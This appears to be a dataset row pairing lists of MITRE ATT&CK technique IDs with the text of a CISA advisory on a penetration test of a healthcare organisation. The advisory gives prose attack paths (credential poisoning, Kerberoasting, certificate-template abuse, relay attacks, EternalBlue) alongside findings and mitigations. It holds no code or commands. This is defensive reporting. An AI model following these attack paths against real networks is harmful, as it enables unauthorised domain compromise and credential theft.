","['T1070', 'T1588', 'T1203', 'T1518', 'T1029', 'T1190', 'T1119', 'T1548', 'T1566', 'T1498', 'T1531', 'T1021', 'T1587', 'T1218', 'T1213']","{'T1003.001', 'T1548.004', 'T1588.002', 'T1078.002', 'T1018', 'T1111', 'T1070.', 'T1016', 'T1548.003', 'T1484.001', 'T1110.001', 'T1059.003', 'T1556.005', 'T1068', 'T1585.002', 'T1490', 'T1562.001', 'T1059.001', 'T1562.002', 'T1041', 'T1489', 'T1560.001', 'T1133', 'T1657', 'T1083', 'T1597.001', 'T1548.005', 'T1562.007', 'T1098.005', 'T1190', 'T1108', 'T1486', 'T1562.004', 'T1518.001'}","{'T1003.001', 'T1588.002', 'T1037.003', 'T1078.002', 'T1059.001, T1021.002', 'T1562.001, T1070.004', 'T1111', 'T1556.004', 'T1016', 'T1548.003', 'T1484.001', 'T1082', 'T1110.001', 'T1059.003', 'T1068', 'T1585.002', 'T1588', 'T1597', 'T1485', 'T1219', 'T1562.001', 'T1562.002', 'T1041', 'T1489', 'T1657, T1486', 'T1560.001', 'T1133', 'T1657', 'T1078.004', 'T1083', 'T1597.001', 'T1548.005', 'T1556.006', 'T1596', 'T1562.007', 'T1195', 'T1108', 'T1190', 'T1486', 'T1078', 'T1018, T1518.001', 'T1566.003', 'T1562.010', 'T1562.004', 'T1518.001', 'T1003'}","{'T1070', 'T1589', 'T1573, T1199', 'T1548, T1077', 'T1111', 'T1563', 'T1078, T1190', 'T1553', 'T1589, T1595, T1566, T1486', 'T1589, T1590, T1595', 'T1040, T1021', 'T1087, T1018, T1518', 'T1646', 'T1068', 'T1204', 'T1072', 'T1490', 'T1219', 'T1484', 'T1203', 'T1087', 'T1589, T1486', 'T1049, T1071, T1486', 'T1486, T1490, T1567', 'T1566', 'T1110', 'T1486, T1489', 'T1082, T1016', 'T1068, T1078', 'T1133', 'T1071', 'T1556', 'T1589, T1590, T1592, T1595', 'T1486, T1485', 'T1564', 'T1486', 'T1059, T1071, T1569, T1021', 'T1048', 'T1560', 'T1560, T1020', 'T1201', 'T1562', 'T1078', 'T1213', 'T1003'}"
7,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-349a,"






Actions to take today to harden your internal environment to mitigate follow-on activity after initial access.




Use phishing-resistant multi-factor authentication (MFA) for all administrative access.
Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials.
Implement network segregation controls.







SUMMARY
In January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a Risk and Vulnerability Assessment (RVA) at the request of a Healthcare and Public Health (HPH) sector organization to identify vulnerabilities and areas for improvement. An RVA is a two-week penetration test of an entire organization, with one week spent on external testing and one week spent assessing the internal network. As part of the RVA, the CISA assessment team conducted web application, phishing, penetration, database, and wireless assessments. The assessed organization was a large organization deploying on-premises software.
During the one-week external assessment, the assessment team did not identify any significant or exploitable conditions in externally available systems that may allow a malicious actor to easily obtain initial access to the organization’s network. Furthermore, the assessment team was unable to gain initial access to the assessed organization through phishing. However, during internal penetration testing, the team exploited misconfigurations, weak passwords, and other issues through multiple attack paths to compromise the organization’s domain.
In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the RVA team’s activities and key findings to provide network defenders and software manufacturers recommendations for improving their organizations’ and customers’ cyber posture, which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector and other critical infrastructure organizations deploying on-premises software, as well as software manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden networks against malicious activity and to reduce the likelihood of domain compromise.
Download the PDF version of this report:


AA23-349A Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment
(PDF,       744.23 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to federal and non-federal entities with respect to cybersecurity risks. See generally 6 U.S.C. §§ 652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating high-level details of the engagement with certain personnel at the organization, CISA conducted the RVA in January 2023.
During RVAs, CISA tests the security posture of an organization’s network over a two-week period to determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the second week (the internal phase), the team determines the susceptibility of the environment to an actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers five services:

Web Application Assessment: The assessment team uses commercial and open source tools to identify vulnerabilities in public-facing and internal web applications, demonstrating how they could be exploited.
Phishing Assessment: The assessment team tests the susceptibility of staff and infrastructure to phishing attacks and determines what impact a phished user workstation could have on the internal network. The RVA team crafts compelling email pretexts and generates payloads, similar to ones used by threat actors, in order to provide a realistic threat perspective to the organization.
Penetration Testing: The assessment team tests the security of an environment by simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish a foothold, escalate privileges, and compromise the domain. The RVA team leverages both open source and commercial tools for host discovery, port and service mapping, vulnerability discovery and analysis, and vulnerability exploitation.
Database Assessment: The assessment team uses commercial database tools to review databases for misconfigurations and missing patches.
Wireless Assessment: The assessment team uses specialized wireless hardware to assess wireless access points, connected endpoints, and user awareness for vulnerabilities.

The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA.

Table 1: In-Scope RVA Services


Phase
Scope
Services




External Assessment
Publicly available HPH-organization endpoints discovered during scanning

Penetration Testing
Phishing Assessment
Web Application Assessment



Internal Assessment
Internally available HPH-organization endpoints discovered during scanning

Database Assessment
Penetration Testing
Web Application Assessment
Wireless Assessment




Phase I: External Assessment
Penetration and Web Application Testing
The CISA team did not identify any significant or exploitable conditions from penetration or web application testing that may allow a malicious actor to easily obtain initial access to the organization’s network.
Phishing Assessment
The CISA team conducted phishing assessments that included both user and systems testing.
The team’s phishing assessment was unsuccessful because the organization’s defensive tools blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s payloads being blocked by host-based protections through a combination of browser, policy, and antivirus software. Some of the payloads were successfully downloaded to disk without being immediately removed, but upon execution, the antivirus software detected the malicious code and blocked it from running. Some payloads appeared to successfully evade host-based protections but did not create a connection to the command and control (C2) infrastructure, indicating they may have been incompatible with the system or blocked by border protections.
Since none of the payloads successfully connected to the assessment team’s C2 server, the team conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link within a phishing email under the pretext of verifying tax information and were then taken to a fake login form.
While twelve unique users from the organization submitted credentials through the malicious form, the CISA team was unable to leverage the credentials because they had limited access to external-facing resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud accounts. Note: At the time of the assessment, the CISA team’s operating procedures did not include certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. However, it is important to note that tools like Evilginx[1] can be leveraged to bypass non-phishing resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a malicious actor’s command and control server, MFA will not prevent the actor from executing commands and carrying out actions under the context of that user.
Phase II: Internal Assessment
Database, Web Application, and Wireless Testing
The CISA assessment team did not identify any significant or exploitable conditions from database or wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, and availability of the tested environment.
The team did identify default credentials [T1078.001] for multiple web interfaces during web application testing and used default printer credentials while penetration testing. (See the Attack Path 2 section for more information.)
Penetration Testing
The assessment team starts internal penetration testing with a connection to the organization’s network but without a valid domain account. The team’s goal is to compromise the domain by gaining domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain domain user access and then escalate privileges until the domain is compromised. This process is called the “attack path”—acquiring initial access to an organization and escalating privileges until the domain is compromised and/or vital assets for the organization are accessed. The attack path requires specialized expertise and is realistic to what adversaries may do in an environment.
For this assessment, the team compromised the organization’s domain through four unique attack paths, and in a fifth attack path the team obtained access to sensitive information.
See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&CK for Enterprise framework. See the Findings section for information on issues that enabled the team to compromise the domain.
Attack Path 1
The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning [T1557.001] with Responder[2], which works in two steps:

Responder listens to multicast name resolution queries (e.g., LLMNR UDP/5355, NBTNS UDP/137) [T1040] and under the right conditions spoofs a response to direct the victim host to a CISA-controlled machine on which Responder is running.
Once a victim connects to the machine, Responder exploits the connection to perform malicious functions such as stealing credentials or opening a session on a targeted host [T1021].

With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. Note: NTLMv2 and other variations of the hash protocol are used for clients to join a domain, authenticate between Active Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and authenticate computers that are not normally a part of the domain.[3] Cracking these passwords may enable malicious actors to establish a foothold in the domain and move laterally or elevate their privileges if the hash belongs to a privileged account.
The service account had a weak password, allowing the team to quickly crack it [T1110.002] and obtain access to the organization’s domain. With domain access, the CISA assessment team enumerated accounts with a Service Principal Name (SPN) set [T1087.002]. SPN is the unique service identifier used by Kerberos authentication[4], and accounts with SPN are susceptible to Kerberoasting.
The CISA team used Impacket’s[5] GetUserSPNs tool to request Ticket-Granting Service (TGS) tickets for all accounts with SPN set and obtained their Kerberos hashes [T1558.003]. Three of these accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a weak password).
Using CrackMapExec[6], the assessment team used ACCOUNT 1 [T1078.002] to successfully connect to a domain controller (DC). The team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share [T1021.002] (see Figure 1).

 

Figure 1: ACCOUNT 1 Domain Admin Privileges

To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it to modify, power off [T1529], and/or delete critical virtual machines, including domain controllers and file servers.
Attack Path 2
The team first mapped the network to identify open web ports [T1595.001], and then attempted to access various web interfaces [T1133] with default administrator credentials. The CISA team was able to log into a printer interface with a default password and found the device was configured with domain credentials to allow employees to save scanned documents to a network share [T1080].
While logged into the printer interface as an administrator, the team 1) modified the “Save as file” configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) changed the Server Name and Network Path to point to a CISA-controlled machine running Responder [T1557]. Then, the team executed a “Connection Test” that sent the username and password over FTP [T1187] to the CISA machine running Responder, which captured cleartext credentials for a non-privileged domain account (ACCOUNT 2).
Using ACCOUNT 2 and Certipy[7], the team enumerated potential certificate template vulnerabilities found in Active Directory Certificate Services (ADCS). Note: ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network. Malicious actors can exploit template misconfigurations [T1649] to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to a domain administrator.
The WebServer template was misconfigured to allow all authenticated users permission to:

Change the properties of the template (via Object Control Permissions with Write Property Principals set to Authenticated Users).
Enroll for the certificate (via Enrollment Permissions including the Authenticated Users group).
Request a certificate for a different user (via EnrolleeSuppliesSubject set as True).

See Figure 2 for the displayed certificate template misconfigurations.

 


The template’s Client Authentication was set to False, preventing the CISA assessment team from requesting a certificate that could be used to authenticate to a server in the domain. To demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, leveraging its status as a mere authenticated user, briefly changed the WebServer template properties to set Client Authentication to True so that a certificate could be obtained for server authentication, ensuring the property was set back to its original setting of False immediately thereafter.
The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as ACCOUNT 3 with the generated certificate [T1550] and retrieved the NTLM hash for ACCOUNT 3 [T1003]. The team used the hash to authenticate to the domain controller [T1550.002] and validated Domain Administrator privileges, demonstrating compromise of the domain via the WebServer template misconfiguration.
Attack Path 3
The CISA team used a tool called CrackMapExec to spray easily guessable passwords [T1110.003] across all domain accounts and obtained two sets of valid credentials for standard domain user accounts.
The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay attack).

 

Figure 3: Misconfigured ADCS Enumerated via Certipy

The team used PetitPotam [8] with ACCOUNT 4 credentials to force the organization’s domain controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced authentication attempt to the ADCS web enrollment service to receive a valid certificate for ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT [T1558] for ACCOUNT 5.
With the TGT for ACCOUNT 5, the CISA team used DCSync to dump the NTLM hash [T1003.006] for ACCOUNT 3 (a Domain Administrator account [see Attack Path 2 section]), effectively leading to domain compromise.
Attack Path 4
The CISA team identified several systems on the organization’s network that do not enforce SMB signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain administrator accounts.
First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. Next, they used Impacket’s NTLMrelayx tool[9] to relay the authentication for the domain administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team then used DonPAPI[10] to dump cleartext credentials through the SOCKS connection and obtained credentials for two additional domain administrator accounts.
The CISA team validated the privileges of these accounts by checking for READ,WRITE access on a domain controller C$ share [T1039], demonstrating Domain Administrator access and therefore domain compromise.
Attack Path 5
The team did vulnerability scanning [T1046] and identified a server vulnerable to CVE-2017-0144 (an Improper Input Validation [CWE-20] vulnerability known as “EternalBlue” that affects SMB version 1 [SMBv1] and enables remote code execution [see Figure 4]).

 

Figure 4: Checking for EternalBlue Vulnerability

The CISA assessment team then executed a well-known EternalBlue exploit [T1210] and established a shell on the server. This shell allowed them to execute commands [T1059.003] under the context of the local SYSTEM account.
With this local SYSTEM account, CISA dumped password hashes from a Security Account Manager (SAM) database [T1003.002]. The team parsed the hashes and identified one for a local administrator account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM hash for the local administrator account, which can be used to authenticate to various services.
The team sprayed the acquired NTLM hash across a network segment and identified multiple instances of password reuse allowing the team to access various resources including sensitive information with the hash.
Findings
Key Issues
The CISA assessments team identified several findings as potentially exploitable vulnerabilities that could compromise the confidentiality, integrity, and availability of the tested environment. Each finding, listed below, includes a description with supporting details. See the Mitigations section for recommendations on how to mitigate these issues.
The CISA team rated their findings on a severity scale from critical to informational (see Table 2).

Table 2: Severity Rating Criteria


Severity
Description




Critical
Critical vulnerabilities pose an immediate and severe risk to the environment because of the ease of exploitation and potential impact. Critical items are reported to the customer immediately.


High
Malicious actors may be able to exercise full control on the targeted device.


Medium
Malicious actors may be able to exercise some control of the targeted device.


Low
The vulnerabilities discovered are reported as items of interest but are not normally exploitable. Many low items reported by security tools are not included in this report because they are often informational, unverified, or of minor risk.


Informational
These vulnerabilities are potential weaknesses within the system that cannot be readily exploited. These findings represent areas that the customer should be cognizant of, but do not require any immediate action.



The CISA assessment team identified four High severity vulnerabilities and one Medium severity vulnerability during penetration testing that contributed to the team’s ability to compromise the domain. See Table 3 for a list and description of these findings.

Table 3: Key Issues Contributing to Domain Compromise


Issue
Severity
Service
Description




Poor Credential Hygiene: Easily Crackable Passwords
High
Penetration Testing

As part of their assessment, the team reviewed the organization’s domain password policy and found it was weak because the minimum password length was set to 8 characters. Passwords less than 15 characters without randomness are easily crackable, and malicious actors with minimal technical knowledge can use these credentials to access the related services.
The assessment team was able to easily crack many passwords throughout the assessment to move laterally and increase access within the domain. Specifically, the team:

Cracked the NTLMv2 hash for a domain account, and subsequently accessed the domain. (See the Attack Path 1 section.)

Cracked the password hash (obtained via Kerberoasting) of a domain administrator account and subsequently compromised the domain. (See the Attack Path 1 section.)



Poor Credential Hygiene: Guessable Credentials
High
Penetration Testing

As part of the penetration test, the assessment team tested to see if one or more services is accessible using a list of enumerated usernames alongside an easily guessed password. The objective is to see if a malicious actor with minimal technical knowledge can use these credentials to access the related services, enabling them to move laterally or escalate privileges. Easily guessable passwords are often comprised of common words, seasons, months and/or years, and are sometimes combined with special characters. Additionally, phrases or names that are popular locally (such as the organization being tested or a local sports teams) may also be considered easily guessable.
The team sprayed common passwords against domain user accounts and obtained valid credentials for standard domain users. (See the Attack Path 3 section.) (Cracking was not necessary for this attack.)



Misconfigured ADCS Certificate Templates
High
Penetration Testing
The team identified a WebServer template configured to allow all authenticated users permission to change the properties of the template and obtain certificates for different users. The team exploited the template to acquire a certificate for a Domain Administrator account (see the Attack Path 2 section).


Unnecessary Network Services Enabled
High
Penetration Testing

Malicious actors can exploit security vulnerabilities and misconfigurations in network services, especially legacy services.
The assessment team identified legacy name resolution protocols (e.g., NetBIOS, LLMNR, mDNS) enabled in the network, and abused LLMNR to capture NTLMv2 hashes, which they then cracked and used for domain access. (See the Attack Path 1 section.)
The team also identified an ADCS server with web enrollment enabled and leveraged it to compromise the domain through coercion and relaying. (See Attack Path 3 section.)
Additionally, the team identified hosts with WebClient and Spooler services, which are often abused by malicious actors to coerce authentication.



Elevated Service Account Privileges
High
Penetration Testing

Applications often require user accounts to operate. These user accounts, which are known as service accounts, often require elevated privileges. If an application or service running with a service account is compromised, an actor may have the same privileges and access as the service account.
The CISA team identified a service account with Domain Administrator privileges and used it to access the domain after cracking its password (See the Attack Path 1 section).



SMB Signing Not Enabled
High
Penetration Testing
The CISA team identified several systems on the organization’s network that do not enforce SMB signing and exploited this for relayed authentication to obtain cleartext credentials for two domain administrator accounts.


Insecure Default Configuration: Default Credentials
Medium
Web Application Assessment

Many off-the-shelf applications are released with built-in administrative accounts using predefined credentials that can often be found with a simple web search. Malicious actors with minimal technical knowledge can use these credentials to access the related services.
During testing, the CISA team identified multiple web interfaces with default administrator credentials and used default credentials for a printer interface to capture domain credentials of a non-privileged domain account. (See the Attack Path 2 section.)




In addition to the issues listed above, the team identified three High and seven Medium severity findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and description of these findings.

Table 4: Additional Key Issues


Issue
Severity
Service
Description




Poor Credential Hygiene: Password Reuse for Administrator and User Accounts
High
Penetration Testing

Elevated password reuse is when an administrator uses the same password for their user and administrator accounts. If the user account password is compromised, it can be used to gain access to the administrative account.
The assessment team identified an instance where the same password was set for an admin user’s administrative account as well as their standard user account.



Poor Credential Hygiene: Password Reuse for Administrator Accounts
Medium
Penetration Testing

If administrator passwords are the same for various administrator accounts, malicious actors can use the password to access all systems that share this credential after compromising one account.
The assessment team found multiple instances of local administrator accounts across various systems using the same password.



Poor Patch Management: Out-of-Date Software
High
Penetration Testing

Patches and updates are released to address existing and emerging security vulnerabilities, and failure to apply the latest leaves systems open to attack with publicly available exploits. (The risk presented by missing patches and updates depends on the severity of the vulnerability).
The assessment team identified several unpatched systems including instances of CVE-2019-0708 (known as “BlueKeep”) and EternalBlue.
The team was unable to successfully compromise the systems with BlueKeep, but they did exploit EternalBlue on a server to implant a shell on a server with local SYSTEM privileges (see the Attack Path 5 section).



Poor Patch Management: Unsupported OS or Application
High
Penetration Testing

Using software or hardware that is no longer supported by the vendor poses a significant security risk because new and existing vulnerabilities are no longer patched). There is no way to address security vulnerabilities on these devices to ensure that they are secure. The overall security posture of the entire network is at risk because an attacker can target these devices to establish an initial foothold into the network.
The assessment team identified end-of-life (EOL) Windows Server 2008 R2 and Windows Server 2008 and Windows 5.1.



Use of Weak Authentication Measures
Medium
Penetration Testing

Applications may have weak or broken mechanisms to verify user identity before granting user access to protected functionalities. Malicious actors can exploit these to bypass authentication and gain access to use application resources and functionality.
The assessment team abused the Cisco Smart Install protocol to obtain configuration files for several Cisco devices on the organization’s network. These files contained encrypted Cisco passwords. (The CISA team was unable to crack these passwords within the assessment timeframe.)



PII Disclosure
Medium
Penetration Testing
The assessment team identified an unencrypted Excel file containing PII on a file share.


Hosts with Unconstrained Delegation Enabled Unnecessarily
Medium
Penetration Testing

The CISA team identified two systems that appeared to be configured with Unconstrained Delegation enabled. Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or silver ticket attacks.
Although the assessment team was unable to fully exploit this configuration because they lost access to one of the vulnerable hosts, it could have led to domain compromise under the right circumstances.



Cleartext Password Disclosure
Medium
Penetration Testing

Storing passwords in cleartext is a security risk because malicious actors with access to these files can use them.
The assessment team identified several unencrypted files on a file share containing passwords for various personal and organizational accounts.



Insecure File Shares
Medium
Penetration Testing

Access to sensitive data (e.g., data related to business functions, IT functions, and/or personnel) should be restricted to only certain authenticated and authorized users.
The assessment team found an unsecured directory on a file share with sensitive IT information. The directory was accessible to all users in the domain group. Malicious actors with user privileges could access and/or exfiltrate this data.




Additional Issues
The CISA team identified one Informational severity within the organization’s networks and systems. These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment, but are not readily exploitable. The information provided is to encourage the stakeholder to investigate these issues further to adjust their environments or eliminate certain aspects as needed, but the urgency is low.

Table 5: Informational Issues That CISA Team Noted


Issue
Severity
Service
Description




Overly Permissive Accounts
  Informational
 Penetration Testing

Account privileges are intended to control user access to host or application resources to limit access to sensitive information in support of a least-privilege security model. When user (or other) accounts have high privileges, users can see and/or do things they normally should not, and malicious actors can exploit this to access host and application resources.
The assessment team identified Active Directory objects where the Human Resources group appeared to be part of the privileged Account Operators group. This may have provided elevated privileges to accounts in the Human Resources group. (The CISA team was unable to validate and demonstrate the potential impact of this relationship within the assessment period).




Noted Strengths
The CISA team noted the following business, technical, and administrative components that enhanced the network security posture of the tested environment:

The organization’s network was found to have several strong, security-oriented characteristics such as:

Effective antivirus software;
Endpoint detection and response capabilities;
Good policies and best practices for protecting users from malicious files including not allowing users to mount ISO files;
Minimal external attack surface, limiting an adversary’s ability to leverage external vulnerabilities to gain initial access to the organization’s networks and systems;
Strong wireless protocols;
And network segmentation.


The organization’s security also demonstrated their ability to detect some of the CISA team's actions throughout testing and overall situational awareness through the use of logs and alerts.
The organization used MFA for cloud accounts. The assessment team obtained cloud credentials via a phishing campaign but was unable to use them because of MFA prompts.

MITIGATIONS
Network Defenders
CISA recommends HPH Sector and other critical infrastructure organizations implement the mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Table 6: Recommendations to Mitigate Identified Issues


Issue
Recommendation




Poor Credential Hygiene: Easily Crackable Passwords


Follow National Institute of Standards and Technologies (NIST) guidelines when creating password policies to enforce use of “strong” passwords that cannot be cracked [CPG 2.B].[11] Consider using password managers to generate and store passwords.
Use “strong” passphrases for private keys to make cracking resource intensive [CPG 2.B]. Do not store credentials within the registry in Windows systems. Establish an organizational policy that prohibits password storage in files.
Ensure adequate password length (ideally 15+ characters) and complexity requirements for Windows service accounts and implement passwords with periodic expiration on these accounts [CPG 2.B]. Use Managed Service Accounts, when possible, to manage service account passwords automatically.




Poor Credential Hygiene: Guessable Credentials


Do not reuse local administrator account passwords across systems. Ensure that passwords are “strong” and unique [CPG 2.C].
Use phishing-resistant multi-factor authentication (MFA) for all administrative access, including domain administrative access [CPG 2.H]. If an organization that uses mobile push-notification-based MFA is unable to implement phishing-resistant MFA, use number matching to mitigate MFA fatigue. For more information, see CISA fact sheets on Implementing Phishing-Resistant MFA and Implementing Number Matching in MFA Applications.




Misconfigured ADCS Certificate Templates


Restrict enrollment rights in templates to only those users or groups that require it. Remove the Enrollee Supplies Subject flag from templates if it is not necessary or enforce manager approval if required. Consider removing Write Owner, Write DACL and Write Property permissions from low-privilege groups, such as Authenticated Users where those permissions are not needed.




Unnecessary Network Services Enabled


Ensure that only ports, protocols, and services with validated business needs are running on each system. Disable deprecated protocols (including NetBIOS, LLMNR, and mDNS) on the network that are not strictly necessary for business functions, or limit the systems and services that use the protocol, where possible [CPG 2.W].
Disable the WebClient and Spooler services where possible to minimize risk of coerced authentication.
Disable ADCS web-enrollment services. If this service cannot be disabled, disable NTLM authentication to prevent malicious actors from performing NTLM relay attacks or abusing the Spooler and WebClient services to coerce and relay authentication to the web-enrollment service.




Elevated Service Account Privileges


Run daemon applications using a non-Administrator account when appropriate.
Configure Service accounts with only the permissions necessary for the services they operate.
To mitigate Kerberoasting attacks, use AES or stronger encryption instead of RC4 for Kerberos hashes [CPG 2.K]. RC4 is considered weak encryption.




SMB Signing Not Enabled


Require SMB signing for both SMB client and server on all systems to prevent certain adversary-in-the-middle and pass-the-hash attacks. See Microsoft’s Overview of Server Message Block signing for more information.




Insecure Default Configuration: Default Credentials


Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials [CPG 2.A].
Before deploying any new devices in a networked environment, change all default passwords for applications, operating systems, routers, firewalls, wireless access points, and other systems to have values consistent with administration-level accounts [CPG 2.A].




Poor Credential Hygiene: Password Reuse for Administrator and User Accounts


Discontinue reuse or sharing of administrative credentials among user/administrative accounts [CPG 2.C].
Use unique credentials across workstations, when possible, in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.
Train users, especially privileged users, against password reuse [CPG 2.I].




Poor Credential Hygiene: Password Reuse for Administrator Accounts


Discontinue reuse or sharing of administrative credentials among systems [CPG 2.C]. When possible, use unique credentials across all workstations in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.
Implement a security awareness program that focuses on the methods commonly used in intrusions that can be blocked through individual action [CPG 2.I].
Implement Local Administrator Password Solution (LAPS) where possible if your OS is older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in. Note: The authoring organizations recommend organizations upgrade to Windows Server 2019 and Windows 10 or greater.




Poor Patch Management: Out-of-Date Software


Enforce consistent patch management across all systems and hosts within the network environment [CPG 1.E].
Where patching is not possible due to limitations, implement network segregation controls [CPG 2.F] to limit exposure of the vulnerable system or host.
Consider deploying automated patch management tools and software update tools for operating system and software/applications on all systems for which such tools are available and safe.




Poor Patch Management: Unsupported OS or Application


Evaluate the use of unsupported hardware and software and discontinue where possible. If discontinuing the use of unsupported hardware and software is not possible, implement additional network protections to mitigate the risk.




Use of Weak Authentication Measures


Require phishing-resistant MFA for all user accounts that have access to sensitive data or systems. If MFA is not possible, it is recommended to, at a minimum, configure a more secure password policy by aligning with guidelines put forth by trusted entities such as NIST [CPG 2.H].




PII Disclosure


Implement a process to review files and systems for insecure handling of PII [CPG 2.L]. Properly secure or remove the information. Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext.
Encrypt PII and other sensitive data, and train users who handle sensitive data to utilize best practices for encrypting data and storing it securely. If sensitive data must be stored on shares or other locations, restrict access to these locations as much as possible through access controls and network segmentation [CPG 2.F, 2.K, 2.L].




Hosts with Unconstrained Delegation Enabled Unnecessarily


Remove Unconstrained Delegation from all servers. If Unconstrained Delegation functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., configure Constrained Delegation, enable the Account is sensitive and cannot be delegated option) or explore whether systems can be retired or further isolated from the enterprise. CISA recommends Windows Server 2019 or greater.




Cleartext Password Disclosure


Implement a review process for files and systems to look for cleartext account credentials. When credentials are found, remove or change them to maintain security [CPG 2.L].
Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext. Consider implementing a secure password manager solution in cases where passwords need to be stored [CPG 2.L].




Insecure File Shares


Restrict access to file shares containing sensitive data to only certain authenticated and authorized users [CPG 2.L].





Additionally, CISA recommends that HPH sector organizations implement the following strategies to mitigate cyber threats:

Mitigation Strategy #1 Asset Management and Security:

CISA recommends that HPH sector organizations implement and maintain an asset management policy to reduce the risk of exposing vulnerabilities, devices, or services that could be exploited by threat actors to gain unauthorized access, steal sensitive data, or disrupt critical services. The focus areas for this mitigation strategy include asset management and asset security, addressing asset inventory, procurement, decommissioning, and network segmentation as they relate to hardware, software, and data assets.


Mitigation Strategy #2 Identity Management and Device Security:

CISA recommends entities secure their devices and digital accounts and manage their online access to protect sensitive data and PII/PHI from compromise. The focus areas for this mitigation strategy include email security, phising prevention, access management, password policies, data protection and loss prevention, and device logs and monitoring solutions.


Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management:

CISA recommends entities mitigate known vulnerabilities and establish secure configuration baselines to reduce the likelihood of threat actors exploiting known vulnerabilities to breach organizational networks. The focus areas for this mitigation strategy include vulnerability and patch Management, and configuration and change management.



For more information on these mitigations strategies, see CISA’s Healthcare and Public Health Sector webpage.
Software Manufacturers
The above mitigations apply to HPH sector and other critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws, and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Eliminate default passwords. Do not provide software with default passwords. To eliminate default passwords, require administrators set a “strong” password [CPG 2.B] during installation and configuration.
Create secure configuration templates. Provide configuration templates with certain safe settings based on an organization’s risk appetite (e.g., low, medium, and high security templates). Support these templates with hardening guides based on the risks the manufacturer has identified. The default configuration should be a secure one, and organizations should need to opt in if they desire a less secure configuration.
Design products so that the compromise of a single security control does not result in compromise of the entire system. For example, narrowly provision user privileges by default and employ ACLs to reduce the impact of a compromised account. This will make it more difficult for a malicious cyber actor to escalate privileges and move laterally.
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

